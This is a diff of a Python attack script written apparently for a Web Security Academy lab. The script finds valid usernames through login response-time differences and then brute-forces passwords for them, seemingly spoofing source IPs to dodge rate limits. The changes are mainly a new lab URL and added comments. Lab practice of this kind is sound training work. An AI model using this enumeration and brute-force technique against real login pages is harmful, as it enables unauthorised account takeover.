@@ -4,7 +4,7 @@ import math
 from random import randint
 
 # Set the URL and necessary headers
-url = 'https://0a7400fc0304d76f81548a7600230099.web-security-academy.net/login'
+url = 'https://0a70007b0483bdb0826f33cd00f40034.web-security-academy.net/login'
 cookies = {'session': '9yWY61V7SdSOSYZpV7TccHgp4sV7F4rn'}
 
 
@@ -46,7 +46,12 @@ def find_username_based_on_response_time():
 # (username, response)
 username_to_response_time = find_username_based_on_response_time()
 
-# find average
+# calculate average, variance, Standard deviation
+# to determine the range which all the response time are mostly in.
+# then we eliminate them all and what remain, are the outlier responses which has more distance to the average
+# and could be the username
+# This is not really necessary while we can sort responses and check them all.
+# but it is more convenient.
 # response_times = list(map(lambda item: item[1], username_to_response_time))
 # response_times_len = len(response_times)
 # response_times_sum = sum(response_times)
@@ -64,9 +69,11 @@ username_to_response_time = find_username_based_on_response_time()
 # )
 # usernames_with_high_response_times.sort(reverse=True)
 
+# sort the array of tuple based on response times, and ij reverse order.
 username_to_response_time.sort(key=lambda item: item[1], reverse=True)
 print(username_to_response_time)
-# iterate over password with the valid username and find the pass word
+
+# iterate over password with the valid usernames and find the pass word
 for username in username_to_response_time:
     for password in passwords:
         ip = random_ip_generator()
